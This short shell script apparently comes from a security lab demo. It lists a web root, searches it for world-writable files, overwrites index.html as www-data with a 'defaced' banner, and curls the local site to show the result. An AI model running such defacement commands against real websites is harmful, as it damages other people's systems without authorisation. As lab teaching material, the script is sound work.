. ~/lab/lib.sh; clear
r 'ls -la /var/www/devops-site/'
r 'find /var/www/devops-site -perm -o+w'
r "sudo -u www-data sh -c 'echo \"<h1>defaced</h1>\" > /var/www/devops-site/index.html'"
r "curl -sk https://localhost/ -H 'Host: devops.local'"
